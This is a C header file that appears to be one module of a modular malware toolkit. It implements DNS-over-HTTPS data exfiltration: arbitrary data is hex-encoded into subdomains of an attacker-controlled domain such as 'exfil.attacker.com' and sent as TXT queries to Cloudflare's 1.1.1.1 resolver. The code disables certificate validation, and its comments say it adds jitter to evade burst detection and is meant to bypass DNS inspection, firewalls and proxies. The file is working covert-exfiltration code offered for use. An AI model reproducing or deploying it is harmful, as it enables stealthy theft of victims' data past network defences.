// chunk: evasion/net_doh
// depends: (none)
// provides: doh_exfil
// headers: windows.h,winhttp.h
// libs: winhttp
// risk: medium
// note: DNS-over-HTTPS exfiltration — encodes data as hex subdomains of a
//       controlled domain, sends TXT queries via HTTPS to Cloudflare (1.1.1.1)
//       or Google (dns.google). All DNS traffic travels as HTTPS to a trusted
//       resolver, bypassing DNS inspection, firewalls, and proxy rules.

#ifndef CHUNK_NET_DOH
#define CHUNK_NET_DOH

#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp")

/* Max label length in DNS is 63 chars; hex encoding = 2 chars/byte → 31 bytes/label */
#define DOH_LABEL_MAX_BYTES 31
/* Max subdomain labels we chain (keeping total under 253 chars) */
#define DOH_MAX_LABELS 4

/* Hex-encode a byte buffer into dst. Returns chars written. */
static int _doh_hex_encode(const BYTE *src, DWORD src_len, char *dst, DWORD dst_sz) {
    static const char hex[] = "0123456789abcdef";
    DWORD i, j = 0;
    for (i = 0; i < src_len && j + 2 < dst_sz; i++) {
        dst[j++] = hex[(src[i] >> 4) & 0xF];
        dst[j++] = hex[src[i] & 0xF];
    }
    dst[j] = '\0';
    return (int)j;
}

/* Build a DNS-style query name from data: <hex1>.<hex2>....<domain>
 * Each label is at most 62 hex chars (31 bytes of data).
 * Returns bytes of data consumed. */
static int _doh_build_qname(const BYTE *data, DWORD data_len,
                             const char *domain, char *qname, DWORD qname_sz) {
    DWORD consumed = 0, pos = 0;
    int labels = 0;

    while (consumed < data_len && labels < DOH_MAX_LABELS) {
        DWORD chunk = data_len - consumed;
        if (chunk > DOH_LABEL_MAX_BYTES) chunk = DOH_LABEL_MAX_BYTES;

        if (pos > 0 && pos < qname_sz) qname[pos++] = '.';
        int written = _doh_hex_encode(data + consumed, chunk,
                                       qname + pos, qname_sz - pos);
        pos += written;
        consumed += chunk;
        labels++;
    }

    /* Append the base domain */
    if (pos + 1 + (DWORD)lstrlenA(domain) < qname_sz) {
        qname[pos++] = '.';
        lstrcpyA(qname + pos, domain);
    }

    return (int)consumed;
}

/* Send a single DoH query to Cloudflare or Google.
 * Uses the JSON API: GET https://1.1.1.1/dns-query?name=X&type=TXT
 * Returns 0 on success (query sent; response ignored). */
static int _doh_send_query(const char *qname) {
    int ret = -1;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"Mozilla/5.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto done;

    /* Use Cloudflare DoH endpoint */
    hConnect = WinHttpConnect(hSession, L"1.1.1.1", 443, 0);
    if (!hConnect) goto done;

    /* Build the query path */
    WCHAR wPath[1024] = {0};
    WCHAR wQname[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, qname, -1, wQname, 512);
    wsprintfW(wPath, L"/dns-query?name=%s&type=TXT", wQname);

    hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) goto done;

    /* Required Accept header for DoH JSON API */
    WinHttpAddRequestHeaders(hRequest,
        L"Accept: application/dns-json", (DWORD)-1,
        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    /* Ignore cert issues for 1.1.1.1 IP-based connection */
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                     &flags, sizeof(flags));

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            NULL, 0, 0, 0))
        goto done;

    if (WinHttpReceiveResponse(hRequest, NULL))
        ret = 0;

done:
    if (hRequest)  WinHttpCloseHandle(hRequest);
    if (hConnect)  WinHttpCloseHandle(hConnect);
    if (hSession)  WinHttpCloseHandle(hSession);
    return ret;
}

/* Exfiltrate data via DNS-over-HTTPS.
 * domain — controlled domain (e.g. "exfil.attacker.com")
 * data/len — payload to exfiltrate
 * Returns 0 on success, -1 on error. */
static int doh_exfil(const char *domain, const BYTE *data, DWORD len) {
    DWORD offset = 0;

    while (offset < len) {
        char qname[512] = {0};
        int consumed = _doh_build_qname(data + offset, len - offset,
                                         domain, qname, sizeof(qname));
        if (consumed <= 0) return -1;

        if (_doh_send_query(qname) != 0)
            return -1;

        offset += consumed;

        /* Small jitter between queries to avoid burst detection */
        Sleep(50 + (GetTickCount() % 150));
    }

    return 0;
}

#endif
